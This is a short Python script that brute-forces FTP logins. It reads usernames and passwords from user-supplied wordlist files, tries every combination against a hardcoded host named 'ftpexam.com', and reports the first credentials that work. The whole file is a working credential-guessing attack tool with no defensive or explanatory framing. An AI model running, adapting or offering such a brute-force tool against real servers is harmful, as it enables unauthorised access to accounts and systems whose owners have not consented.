from ftplib import FTP

ftp_host = 'ftpexam.com'
ftp_port = 21


def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]


def brute_force_ftp():
    user_list = input("[*] Enter Path Of Users List:- ")
    pass_list = input("[*] Enter Path Of Password List:- ")
    print('\n')
    usernames = read_file(user_list)
    passwords = read_file(pass_list)

    for username in usernames:
        for password in passwords:
            try:
                ftp = FTP()
                ftp.connect(ftp_host, ftp_port)
                ftp.login(username, password)
                print(f"Successful login - Username: {username}, Password: {password}")
                ftp.quit()

                return
            except Exception as e:
                print(f"Failed login - Username: {username}, Password: {password} - {e}")
                continue


brute_force_ftp()
